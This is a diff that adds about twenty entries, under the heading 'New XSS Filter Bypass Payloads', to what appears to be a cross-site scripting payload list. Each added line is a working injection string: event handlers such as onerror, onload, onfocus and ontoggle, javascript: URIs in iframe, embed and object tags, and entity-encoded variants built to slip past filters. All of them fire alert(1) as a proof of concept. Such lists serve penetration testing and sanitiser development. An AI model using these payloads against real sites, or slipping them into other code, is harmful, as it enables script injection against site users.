@@ -194,3 +194,26 @@ top['al'+'ert']('bypass')
 
 # SVG foreignObject
 <svg><foreignObject><body><script>alert(1)</script></body></foreignObject></svg>
+# --- Added 2026-09-28 ---
+# --- New XSS Filter Bypass Payloads ---
+<object onerror=alert(1) data="javascript:alert(1)">
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<audio src=x onerror=alert(1)>
+<video><source onerror=alert(1)>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<isindex action=javascript:alert(1) type=image>
+<body onload=alert(1)>
+<input autofocus onfocus=alert(1)>
+<textarea onfocus=alert(1)>autofocus</textarea>
+<keygen autofocus onfocus=alert(1)>
+<a href="javascript:void(0)" onclick=alert(1)>click</a>
+<svg/onload=alert(1)>
+<iframe src=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+<applet code=alert(1)>
+<form id=test oninput=alert(1)>
+<math><mi// xlink:href="data:x,<script>alert(1)</script>">
+<svg><script>alert&#40;1&#41;</script></svg>
+<img src=x onerror="&#97;lert(1)">
+<svg/onload=window.onerror=alert;throw+1>
